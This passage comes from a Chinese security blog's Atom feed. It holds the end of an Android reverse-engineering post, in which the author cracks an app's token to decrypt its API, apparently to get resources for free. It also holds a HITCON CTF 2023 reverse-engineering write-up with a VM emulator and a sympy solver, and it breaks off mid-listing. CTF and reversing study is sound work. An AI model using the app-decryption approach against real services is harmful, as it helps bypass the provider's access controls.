class="keyword">var</span> n = [], o = <span class="number">0</span>; o &lt; t.length; o++)</span><br><span class="line">            n.push((t[o] &gt;&gt;&gt; <span class="number">4</span>).toString(<span class="number">16</span>)), n.push((<span class="number">15</span> &amp; t[o]).toString(<span class="number">16</span>));</span><br><span class="line">          <span class="keyword">return</span> n.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        hexToBytes: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = [], o = <span class="number">0</span>; o &lt; t.length; o += <span class="number">2</span>)</span><br><span class="line">            n.push(<span class="built_in">parseInt</span>(t.substr(o, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">return</span> n;</span><br><span class="line">        &#125;,</span><br><span class="line">        bytesToBase64: <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> o = [], u = <span class="number">0</span>; u &lt; n.length; u += <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">for</span> (</span><br><span class="line">              <span class="keyword">var</span> f = (n[u] &lt;&lt; <span class="number">16</span>) | (n[u + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | n[u + <span class="number">2</span>], s = <span class="number">0</span>;</span><br><span class="line">              s &lt; <span class="number">4</span>;</span><br><span class="line">              s++</span><br><span class="line">            )</span><br><span class="line">              <span class="number">8</span> * u + <span class="number">6</span> * s &lt;= <span class="number">8</span> * n.length</span><br><span class="line">                ? o.push(t.charAt((f &gt;&gt;&gt; (<span class="number">6</span> * (<span class="number">3</span> - s))) &amp; <span class="number">63</span>))</span><br><span class="line">                : o.push(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> o.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        base64ToBytes: <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">          n = n.replace(<span class="regexp">/[^A-Z0-9+\/]/gi</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> o = [], u = <span class="number">0</span>, f = <span class="number">0</span>; u &lt; n.length; f = ++u % <span class="number">4</span>)</span><br><span class="line">            <span class="number">0</span> != f &amp;&amp;</span><br><span class="line">              o.push(</span><br><span class="line">                ((t.indexOf(n.charAt(u - <span class="number">1</span>)) &amp; (<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">-2</span> * f + <span class="number">8</span>) - <span class="number">1</span>)) &lt;&lt;</span><br><span class="line">                  (<span class="number">2</span> * f)) |</span><br><span class="line">                  (t.indexOf(n.charAt(u)) &gt;&gt;&gt; (<span class="number">6</span> - <span class="number">2</span> * f))</span><br><span class="line">              );</span><br><span class="line">          <span class="keyword">return</span> o;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">      (m.exports = n);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="number">651</span>,</span><br><span class="line">  []</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>先不管它，我们可以发现其实token里面是有那些参数的</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030202639200.png" alt="image-20231030202639200"></p><p>然后我们就能发现方向是对的，这个P是在了token里面</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030203417032.png" alt="image-20231030203417032"></p><p>随便抓个包试验一下即可发现确实能解密出API</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030213814859.png" alt="image-20231030213814859"></p><p>总得来说还是非常白给，因为就是JS代码，混淆了也还是相对能看的，密钥也就简单的拼接，适合大一新生练手（x</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直想搞安卓逆向去白嫖资源，但是大部分都是断断续续地搞，没啥系统性，想起啥了就学啥，比较没有方向性。年初的时候心血来潮买了个测试机使用，但是好像由于配置过于低了一开frida-server就卡死。正好最近新换了个手机，于是就把之前那个屏幕碎了一角的小米10拿来刷机当测试机了</summary>
      
    
    
    
    
    <category term="reverse" scheme="http://phot0n.com/tags/reverse/"/>
    
    <category term="android" scheme="http://phot0n.com/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>10月17日随笔</title>
    <link href="http://phot0n.com/2023/10/17/10%E6%9C%8817%E6%97%A5%E9%9A%8F%E7%AC%94/"/>
    <id>http://phot0n.com/2023/10/17/10%E6%9C%8817%E6%97%A5%E9%9A%8F%E7%AC%94/</id>
    <published>2023-10-17T00:31:32.000Z</published>
    <updated>2023-10-17T00:33:12.276Z</updated>
    
    <content type="html"><![CDATA[<p>距离上次写随笔已经过了好久了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;距离上次写随笔已经过了好久了&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="随笔" scheme="http://phot0n.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>HITCONCTF-2023</title>
    <link href="http://phot0n.com/2023/09/11/HITCONCTF-2023/"/>
    <id>http://phot0n.com/2023/09/11/HITCONCTF-2023/</id>
    <published>2023-09-11T04:39:49.000Z</published>
    <updated>2023-09-13T12:44:02.085Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>蛤蛤，有蠢比做qemu逃逸没看见<code>-sandbox on</code>，做了半天以为调通了结果发现爆了<code>bad syscall</code> 。唐完了(我有抑郁症)</p></blockquote><p>军训完的第一个周末，终于有时间看比赛了，不过因为过于菜没啥输出的。一共看了一个re一个pwn题，出了个re。pwn题花了挺长时间的，最后一天晚上被大大卷拉去聚餐了(回去之后还没做出来，没看见有沙盒)。不过还是第一次正式比赛做qemu逃逸的题，也没接触过这种有沙盒的qemu逃逸题(不过想法是差不多的)。调试也挺花时间的，每次打包文件系统都要花好长时间，而且也是第一次用docker进行调试，不太熟。不过收获还是很大的。</p><p>赛后把pwn的题复现一下，主要是那三个吧。qemu逃逸，kernel pwn，还有用户态利用。哦对还有re的延申pwn题。Kernel在比赛中没啥时间打，打算自己不看wp做做看，好像也不是很难的样子</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="LessEqualMore"><a href="#LessEqualMore" class="headerlink" title="LessEqualMore"></a>LessEqualMore</h2><p>可以写出等价python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;chal.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">code = f.read().split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(code)):</span><br><span class="line">    code[i] = int(code[i])</span><br><span class="line">    <span class="comment"># if(code[i] in success):</span></span><br><span class="line">    <span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line">RIP = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bignum</span>():</span></span><br><span class="line">    <span class="keyword">return</span> -int(input())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op1</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">0</span>):</span><br><span class="line">        bignum = get_bignum()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bignum = code[a]</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>):</span><br><span class="line">        print(chr(bignum),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        code[b] -=bignum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line">k = []</span><br><span class="line"></span><br><span class="line">code_2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    code_2.append(i)</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(RIP&gt;=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(&quot;================&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;RIP = &#123;RIP&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;code[&#123;code[RIP+1]&#125;]-code[&#123;code[RIP]&#125;] = &#123;code[code[RIP+1]]&#125; - &#123;code[code[RIP]]&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;code[&#123;RIP+2&#125;] = &#123;code[RIP+2]&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># if(code[RIP+2] != RIP+3 and code[RIP+1] != code[RIP]):</span></span><br><span class="line">        <span class="comment">#     print(&quot;may judge&quot;)</span></span><br><span class="line">        <span class="comment"># for i in range(3):</span></span><br><span class="line">        <span class="comment">#     print(f&quot;code[&#123;RIP+i&#125;] = &#123;code[RIP+i]&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># if(code[code[RIP]] &gt;=33 and code[code[RIP]]&lt;=125):</span></span><br><span class="line">        <span class="comment">#     ans.append(code[code[RIP]])</span></span><br><span class="line">            <span class="comment"># k.append(RIP)</span></span><br><span class="line">            <span class="comment"># print(chr(code[code[RIP]]))</span></span><br><span class="line">        <span class="keyword">if</span>(RIP==<span class="number">5436</span>):</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag !=<span class="number">2</span>):</span><br><span class="line">                flag+=<span class="number">1</span>    </span><br><span class="line">        op1(code[RIP],code[RIP+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span>(code[code[RIP+<span class="number">1</span>]]&lt;=<span class="number">0</span>):</span><br><span class="line">            RIP = code[RIP+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            RIP += <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">&quot;-1 to exit, -2 to continue,else to show code&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            op = int(input())</span><br><span class="line">            <span class="keyword">if</span>(op==<span class="number">-1</span>):</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span>(op==<span class="number">-2</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(op==<span class="number">-3</span>):</span><br><span class="line">                RIP = int(input())</span><br><span class="line">            <span class="keyword">elif</span>(op==<span class="number">-4</span>):</span><br><span class="line">                print(xret(int(input())))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                    print(<span class="string">f&quot;code[<span class="subst">&#123;op+i&#125;</span>] = <span class="subst">&#123;code[op+i]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># f = open(&quot;cd.txt&quot;,&quot;r+&quot;)</span></span><br><span class="line"><span class="comment"># f.write(str(code))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(code)):</span></span><br><span class="line"><span class="comment">#     if(code[i] != code_2[i]):</span></span><br><span class="line"><span class="comment">#         print(f&quot;&#123;i&#125;,&#123;code_2[i]&#125;,&#123;code[i]&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>通过调试可以知道，code[19]-code[79]这部分是存我们输入的flag的，RIP=5436开始对输入进行校验。</p><p>所以我们可以把RIP=5436这个点的code给dump出来，然后符号化code[19]-code[79]，从RIP=5436开始运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sm</span><br><span class="line">f = open(<span class="string">&quot;cd.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">code = eval(f.read())</span><br><span class="line"><span class="comment"># print(cd)</span></span><br><span class="line">print(code[<span class="number">7</span>])</span><br><span class="line">length = <span class="number">64</span></span><br><span class="line">code[<span class="number">4</span>] = length</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">4375</span>,<span class="number">4376</span>,<span class="number">4394</span>]:</span><br><span class="line">    code[i] = <span class="number">16</span>+length<span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">4561</span>,<span class="number">4562</span>,<span class="number">4580</span>]:</span><br><span class="line">    code[i] = <span class="number">16</span>+length</span><br><span class="line"><span class="comment"># s = &quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(length):</span></span><br><span class="line"><span class="comment">#     s+=f&quot;x&#123;i&#125;, &quot;</span></span><br><span class="line"><span class="comment"># s = s[:-2]</span></span><br><span class="line"><span class="comment"># s+= f&quot; = sm.symbols(&#x27;x0:&#123;length&#125;&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># eval(s)</span></span><br><span class="line"><span class="comment"># print(x0)</span></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33, x34, x35, x36, x37, x38, x39, x40, x41, x42, x43, x44, x45, x46, x47, x48, x49, x50, x51, x52, x53, x54, x55, x56, x57, x58, x59, x60, x61, x62, x63 = sm.symbols(<span class="string">&#x27;x0:64&#x27;</span>,integer=<span class="literal">True</span>,positive=<span class="literal">True</span>,domain=sm.Interval(<span class="number">0</span>, <span class="number">256</span>))</span><br><span class="line"><span class="comment"># for i in range(length):</span></span><br><span class="line"><span class="comment">#     print(f&quot;code[&#123;16+i&#125;] =x&#123;i&#125;&quot;) </span></span><br><span class="line">code[<span class="number">16</span>] =<span class="number">104</span></span><br><span class="line">code[<span class="number">17</span>] =<span class="number">105</span></span><br><span class="line">code[<span class="number">18</span>] =<span class="number">116</span></span><br><span class="line">code[<span class="number">19</span>] =<span class="number">99</span></span><br><span class="line">code[<span class="number">20</span>] =<span class="number">111</span></span><br><span class="line">code[<span class="number">21</span>] =<span class="number">110</span></span><br><span class="line">code[<span class="number">22</span>] =<span class="number">123</span></span><br><span class="line">code[<span class="number">23</span>] =<span class="number">114</span></span><br><span class="line"><span class="comment"># code[16] =x0</span></span><br><span class="line"><span class="comment"># code[17] =x1</span></span><br><span class="line"><span class="comment"># code[18] =x2</span></span><br><span class="line"><span class="comment"># code[19] =x3</span></span><br><span class="line"><span class="comment"># code[20] =x4</span></span><br><span class="line"><span class="comment"># code[21] =x5</span></span><br><span class="line"><span class="comment"># code[22] =x6</span></span><br><span class="line"><span class="comment"># code[23] =x7</span></span><br><span class="line"><span class="comment"># code[24] =51</span></span><br><span class="line"><span class="comment"># code[25] =118</span></span><br><span class="line"><span class="comment"># code[26] =69</span></span><br><span class="line"><span class="comment"># code[27] =114</span></span><br><span class="line"><span class="comment"># code[28] =115</span></span><br><span class="line"><span class="comment"># code[29] =49</span></span><br><span class="line"><span class="comment"># code[30] =110</span></span><br><span class="line"><span class="comment"># code[31] =103</span></span><br><span class="line">code[<span class="number">24</span>] =x8</span><br><span class="line">code[<span class="number">25</span>] =x9</span><br><span class="line">code[<span class="number">26</span>] =x10</span><br><span class="line">code[<span class="number">27</span>] =x11</span><br><span class="line">code[<span class="number">28</span>] =x12</span><br><span class="line">code[<span class="number">29</span>] =x13</span><br><span class="line">code[<span class="number">30</span>] =x14</span><br><span class="line">code[<span class="number">31</span>] =x15</span><br><span class="line">code[<span class="number">32</span>] =x16</span><br><span class="line">code[<span class="number">33</span>] =x17</span><br><span class="line">code[<span class="number">34</span>] =x18</span><br><span class="line">code[<span class="number">35</span>] =x19</span><br><span class="line">code[<span class="number">36</span>] =x20</span><br><span class="line">code[<span class="number">37</span>] =x21</span><br><span class="line">code[<span class="number">38</span>] =x22</span><br><span class="line">code[<span class="number">39</span>] =x23</span><br><span class="line">code[<span class="number">40</span>] =x24</span><br><span class="line">code[<span class="number">41</span>] =x25</span><br><span class="line">code[<span class="number">42</span>] =x26</span><br><span class="line">code[<span class="number">43</span>] =x27</span><br><span class="line">code[<span class="number">44</span>] =x28</span><br><span class="line">code[<span class="number">45</span>] =x29</span><br><span class="line">code[<span class="number">46</span>] =x30</span><br><span class="line">code[<span class="number">47</span>] =x31</span><br><span class="line">code[<span class="number">48</span>] =x32</span><br><span class="line">code[<span class="number">49</span>] =x33</span><br><span class="line">code[<span class="number">50</span>] =x34</span><br><span class="line">code[<span class="number">51</span>] =x35</span><br><span class="line">code[<span class="number">52</span>] =x36</span><br><span class="line">code[<span class="number">53</span>] =x37</span><br><span class="line">code[<span class="number">54</span>] =x38</span><br><span class="line">code[<span class="number">55</span>] =x39</span><br><span class="line">code[<span class="number">56</span>] =x40</span><br><span class="line">code[<span class="number">57</span>] =x41</span><br><span class="line">code[<span class="number">58</span>] =x42</span><br><span class="line">code[<span class="number">59</span>] =x43</span><br><span class="line">code[<span class="number">60</span>] =x44</span><br><span class="line">code[<span class="number">61</span>] =x45</span><br><span class="line">code[<span class="number">62</span>] =x46</span><br><span class="line">code[<span class="number">63</span>] =x47</span><br><span class="line">code[<span class="number">64</span>] =x48</span><br><span class="line">code[<span class="number">65</span>] =x49</span><br><span class="line">code[<span class="number">66</span>] =x50</span><br><span class="line">code[<span class="number">67</span>] =x51</span><br><span class="line">code[<span class="number">68</span>] =x52</span><br><span class="line">code[<span class="number">69</span>] =x53</span><br><span class="line">code[<span class="number">70</span>] =x54</span><br><span class="line">code[<span class="number">71</span>] =x55</span><br><span class="line">code[<span class="number">72</span>] =x56</span><br><span class="line">code[<span class="number">73</span>] =x57</span><br><span class="line">code[<span class="number">74</span>] =x58</span><br><span class="line">code[<span class="number">75</span>] =x59</span><br><span class="line">code[<span class="number">76</span>] =x60</span><br><span class="line">code[<span class="number">77</span>] =x61</span><br><span class="line">code[<span class="number">78</span>] =x62</span><br><span class="line">code[<span class="number">79</span>] =x63</span><br><span class="line"></span><br><span class="line">indx = <span class="number">0</span></span><br><span class="line"><span class="comment"># for i in range(255):</span></span><br><span class="line"><span class="comment">#     print(code[1040+i])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op1</span>(<span class="params">a,b,indx</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(type(a)==sm.core.add.Add):</span><br><span class="line">        varname = <span class="string">f&quot;y<span class="subst">&#123;indx&#125;</span>&quot;</span></span><br><span class="line">        vars()[varname] = sm.symbols(varname,integer=<span class="literal">True</span>,positive=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># exec(f&quot;y&#123;y&#125; = sm.symbols(&#x27;y&#123;y&#125;&#x27;)&quot;)</span></span><br><span class="line">        <span class="comment"># exec(f&quot;bignum=y&#123;y&#125;&quot;)</span></span><br><span class="line">        bignum = vars()[varname]</span><br><span class="line">        indx+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(a&lt;<span class="number">0</span>):</span><br><span class="line">            bignum = get_bignum()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bignum = code[a]</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>):</span><br><span class="line">        print(chr(bignum),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        code[b] -=bignum</span><br><span class="line">        code[b] = sm.sympify(code[b])</span><br><span class="line">RIP = <span class="number">5436</span></span><br><span class="line">indx = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(RIP&gt;=<span class="number">0</span>):</span><br><span class="line">    op1(code[RIP],code[RIP+<span class="number">1</span>],indx)</span><br><span class="line">    bore = code[code[RIP+<span class="number">1</span>]] &lt;=<span class="number">0</span></span><br><span class="line">    <span class="comment"># print(type(bore))</span></span><br><span class="line">    <span class="keyword">if</span>(type(bore)==sm.core.relational.LessThan):</span><br><span class="line">        ans_max_set = &#123;&#125;</span><br><span class="line">        ans_min_set = &#123;&#125;</span><br><span class="line">        sym = bore.free_symbols</span><br><span class="line">        <span class="keyword">while</span>(sym != set()):</span><br><span class="line">            tmp = sym.pop()</span><br><span class="line">            ans_max_set[tmp]=<span class="number">256</span></span><br><span class="line">            ans_min_set[tmp]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(bore.subs(ans_max_set)  <span class="keyword">or</span> bore.subs(ans_min_set) ):</span><br><span class="line">            RIP = code[RIP+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            RIP += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(code[code[RIP+<span class="number">1</span>]] &lt;=<span class="number">0</span>):</span><br><span class="line">            RIP = code[RIP+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            RIP +=<span class="number">3</span></span><br><span class="line"><span class="comment"># print(code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(code)):</span><br><span class="line">    print(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> -&gt;<span class="subst">&#123;code[i]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行完之后dump code，就能得到一系列方程组</p><p>如下</p><p>我之前是一步步尝试的，所以前8个flag字符就直接试出来了，然后还发现了方程组对应的值存在了98开始的内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 